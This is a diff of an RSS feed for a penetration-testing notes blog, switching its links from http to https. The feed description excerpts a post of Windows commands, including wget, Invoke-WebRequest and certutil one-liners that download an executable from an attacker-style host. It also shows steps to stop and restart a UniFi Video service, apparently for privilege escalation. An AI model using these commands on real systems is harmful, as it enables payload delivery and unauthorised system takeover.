@@ -2,21 +2,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Powershell on pentest notes</title>
-    <link>http://sosprz.github.io/tags/powershell/</link>
+    <link>https://sosprz.github.io/tags/powershell/</link>
     <description>Recent content in Powershell on pentest notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>Your language code</language>
     <lastBuildDate>Sun, 30 Dec 2018 08:53:12 +0100</lastBuildDate>
     
-	<atom:link href="http://sosprz.github.io/tags/powershell/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://sosprz.github.io/tags/powershell/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Windows cmd</title>
-      <link>http://sosprz.github.io/post/windows-cmd/</link>
+      <link>https://sosprz.github.io/post/windows-cmd/</link>
       <pubDate>Sun, 30 Dec 2018 08:53:12 +0100</pubDate>
       
-      <guid>http://sosprz.github.io/post/windows-cmd/</guid>
+      <guid>https://sosprz.github.io/post/windows-cmd/</guid>
       <description>Various commands  type get-content dir /ah whoami dir /s where /r c:\Windows bash.* START filenae.lnk where /r c:\ wsl.conf 
 How to download file wget wget http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe  Invoke-WebRequest Invoke-WebRequest http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe Certutil certutil.exe -urlcache -split -f http://10.10.10.10/file.xml file.xml
 Manage services Restart-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo; Stop-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo;</description>
